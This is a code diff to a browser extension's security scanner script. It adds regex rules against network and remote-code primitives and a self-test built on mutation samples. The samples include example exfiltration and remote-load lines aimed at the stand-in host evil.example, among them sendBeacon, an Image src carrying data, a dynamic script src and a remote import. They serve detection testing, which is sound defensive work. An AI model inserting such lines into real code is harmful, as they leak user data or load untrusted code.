@@ -33,6 +33,7 @@ function walk(dir, out = []) {
 const files = walk(EXT);
 const jsFiles = files.filter((f) => f.endsWith('.js'));
 const jsonFiles = files.filter((f) => f.endsWith('.json'));
+const SRC_EXTS = ['.js', '.html'];
 
 // ---------------------------------------------------------------------------------------
 // fetch-FAMILY zero-network check (F-V19-2) — shared by the main scan and `--self-test`.
@@ -61,7 +62,10 @@ function fetchFamilyFindings(rel, src) {
   ALIAS_DEF.lastIndex = 0;
   while ((m = ALIAS_DEF.exec(src))) aliases.push(m[1]);
   const masked = src.replace(FETCH_BIND, (s) => ' '.repeat(s.length));
-  const dotFetch = /(?:^|[^\w$])\.\s*fetch\b/g;
+  // F-V19-2 residual (S13 §13.4): the anchor is the `.fetch` member itself, not `.fetch` preceded by
+  // a non-identifier char — `globalThis.fetch` (a plain alias acquired without `.bind(`) used to slip
+  // past both regexes. The approved `<g>.fetch.bind(<g>)` spelling is masked above, so it stays clean.
+  const dotFetch = /\.\s*fetch\b/g;
   while ((m = dotFetch.exec(masked))) out.push(`SEC ${rel}: fetch-family reference ${JSON.stringify(m[0].trim())} outside the approved chrome.runtime.getURL binding`);
   const bareFetch = /(?:^|[^\w$.])fetch\s*\(/g;
   while ((m = bareFetch.exec(masked))) out.push(`SEC ${rel}: bare fetch( call — remote primitive outside the approved alias`);
@@ -76,18 +80,69 @@ function fetchFamilyFindings(rel, src) {
   }
   return out;
 }
-// `--self-test`: prove the fetch-family rule on the shipped popup.js plus two mutations
-// (a raw remote fetch, and the alias called with a remote URL). Exits non-zero on any miss.
+// F-V19-2 residual (S13 §13.4): the realistic network / remote-code forms the original token set
+// missed — each one a plain, non-adversarial way a future edit could reintroduce a network call.
+// Keyed to the PRIMITIVE (not to a URL), so a computed/obfuscated URL cannot slip past. The shipped
+// package contains NONE of these forms (verified: zero hits across extension/**), so they add no
+// false positive; the only `.src`/innerHTML/`import` uses in the package are a CSS selector, a
+// `'<div class="empty">'` innerHTML and static ES imports in the test harnesses (outside extension/).
+const REMOTE_CODE = [/\beval\s*\(/, /new\s+Function\s*\(/, /\bfetch\s*\(/, /XMLHttpRequest/, /new\s+WebSocket\s*\(/, /\bimportScripts\s*\(/];
+const NET_VECTORS = [
+  { re: /\bsendBeacon\s*\(/, label: 'navigator.sendBeacon (CSP does not block it)' },
+  { re: /new\s+EventSource\s*\(/, label: 'EventSource (unmodelled network primitive)' },
+  { re: /new\s+Image\s*\(/, label: 'new Image( — an <img> exfil channel once .src is set' },
+  { re: /\.\s*src\s*=/, label: '.src assignment (remote asset / script / image source)' },
+  { re: /createElement\s*\(\s*['"]script['"]\s*\)/, label: "createElement('script') — dynamic remote <script>" },
+  { re: /innerHTML\s*=\s*['"][^'"]*<script/i, label: 'innerHTML carrying an inline <script' },
+  { re: /(?:^|[^\w$.])import\(|(?:^|[^\w$.])import\s+\(\s*['"`]/, label: 'dynamic import( — remote module load' },
+  { re: /\{\s*fetch\b/, label: 'destructured fetch ({ fetch } = …)' },
+  { re: /\[\s*['"]fetch['"]\s*\]/, label: "bracket fetch access (window['fetch'])" },
+  { re: /Reflect\.get\s*\([^)]*['"]fetch['"]/, label: "Reflect.get(…, 'fetch')" },
+  { re: /(?:^|[^\w$.])eval\b(?!\s*\()/, label: 'bare eval reference (indirect eval, e.g. (0,eval))' },
+];
+// The complete per-file security scan (section 4 + `--self-test` share it, so the self-test proves
+// the rule set the gate actually runs).
+function securityFindings(rel, src, isHtml) {
+  const out = [];
+  for (const re of REMOTE_CODE) if (re.test(src)) out.push(`SEC ${rel}: forbidden primitive ${re}`);
+  for (const v of NET_VECTORS) if (v.re.test(src)) out.push(`SEC ${rel}: forbidden network/remote-code form — ${v.label}`);
+  out.push(...fetchFamilyFindings(rel, src));
+  if (isHtml && /src\s*=\s*["']https?:/i.test(src)) out.push(`SEC ${rel}: remote <script src>`);
+  if (/\balert\s*\(/.test(src) && !/\/(popup|stats)\.js$/.test(rel)) out.push(`SEC ${rel}: alert() outside popup/stats`);
+  return out;
+}
+// `--self-test`: prove the rule set on the shipped package plus one mutation per vector. Exits
+// non-zero on any miss (a vector that is NOT caught) or any false positive on the shipped sources.
 if (process.argv.includes('--self-test')) {
   const shipped = fs.readFileSync(path.join(EXT, 'popup.js'), 'utf8');
+  const shippedAll = walk(EXT)
+    .filter((f) => SRC_EXTS.some((x) => f.endsWith(x)))
+    .map((f) => fs.readFileSync(f, 'utf8')).join('\n');
+  const vectors = [
+    ['raw fetch', "\nfetch('https://evil.example');\n"],
+    ['readAsset(remote)', null], // handled below (needs the shipped alias call replaced)
+    ['navigator.sendBeacon', "\nnavigator.sendBeacon('https://evil.example/x', 'd');\n"],
+    ['new EventSource', "\nnew EventSource('https://evil.example/x');\n"],
+    ['new Image + .src', "\nconst im = new Image(); im.src = 'https://evil.example/x?d=' + Date.now();\n"],
+    ["createElement('script') + .src", "\ndocument.createElement('script').src = 'https://evil.example/x.js';\n"],
+    ['dynamic import(', "\nimport('https://evil.example/x.js');\n"],
+    ['destructured fetch', "\nconst { fetch: f } = window; f('https://evil.example/x');\n"],
+    ["window['fetch']", "\nwindow['fetch']('https://evil.example/x');\n"],
+    ["Reflect.get(…,'fetch')", "\nReflect.get(globalThis, 'fetch')('https://evil.example/x');\n"],
+    ['(0,eval)', "\n(0, eval)('fetch')('https://evil.example/x');\n"],
+    ['plain fetch alias without .bind', "\nconst rf = globalThis.fetch; rf('https://evil.example/x');\n"],
+    ['innerHTML with <script src>', "\ndocument.body.innerHTML = '<script src=\"https://evil.example/x.js\"></script>';\n"],
+  ];
   const cases = [
     { name: 'shipped popup.js (bound alias + chrome.runtime.getURL) => expect NO finding', src: shipped, want: 0 },
-    { name: "raw fetch('https://evil.example') => expect a finding", src: shipped + "\nfetch('https://evil.example');\n", want: 1 },
-    { name: "readAsset('https://evil.example') => expect a finding", src: shipped.replace(/readAsset\(chrome\.runtime\.getURL\([^)]*\)\)/, "readAsset('https://evil.example')"), want: 1 },
+    { name: 'ALL shipped extension/** sources => expect NO finding (no false positive)', src: shippedAll, want: 0 },
+    { name: 'raw fetch(remote)', src: shipped + vectors[0][1], want: 1 },
+    { name: "readAsset('https://evil.example')", src: shipped.replace(/readAsset\(chrome\.runtime\.getURL\([^)]*\)\)/, "readAsset('https://evil.example')"), want: 1 },
+    ...vectors.slice(2).map(([n, v]) => ({ name: n, src: shipped + v, want: 1 })),
   ];
   let bad = 0;
   for (const c of cases) {
-    const found = fetchFamilyFindings('extension/popup.js', c.src);
+    const found = securityFindings('extension/popup.js', c.src, false);
     const ok = c.want === 0 ? found.length === 0 : found.length >= 1;
     if (!ok) bad++;
     console.log((ok ? 'PASS  ' : 'FAIL  ') + c.name + (found.length ? '\n        ' + found.join('\n        ') : ''));
@@ -140,23 +195,13 @@ try {
   findings.push(`I18N scan failed: ${e.message}`);
 }
 
-// 4. security — remote code / network primitives
-const SRC_EXTS = ['.js', '.html'];
-const REMOTE_CODE = [/\beval\s*\(/, /new\s+Function\s*\(/, /\bfetch\s*\(/, /XMLHttpRequest/, /new\s+WebSocket\s*\(/, /\bimportScripts\s*\(/];
+// 4. security — remote code / network primitives (the shared scanner above: REMOTE_CODE +
+//    NET_VECTORS + the fetch-family alias rule + remote <script src> + alert placement)
 for (const f of files.filter((f) => SRC_EXTS.some((x) => f.endsWith(x)))) {
   checked++;
   const rel = path.relative(ROOT, f).replace(/\\/g, '/');
   const src = fs.readFileSync(f, 'utf8');
-  for (const re of REMOTE_CODE) {
-    if (re.test(src)) findings.push(`SEC ${rel}: forbidden primitive ${re}`);
-  }
-  for (const msg of fetchFamilyFindings(rel, src)) findings.push(msg);
-  if (f.endsWith('.html') && /src\s*=\s*["']https?:/i.test(src)) {
-    findings.push(`SEC ${rel}: remote <script src>`);
-  }
-  if (/\balert\s*\(/.test(src) && !/\/(popup|stats)\.js$/.test(rel)) {
-    findings.push(`SEC ${rel}: alert() outside popup/stats`);
-  }
+  for (const msg of securityFindings(rel, src, f.endsWith('.html'))) findings.push(msg);
 }
 
 // 5. manifest hygiene
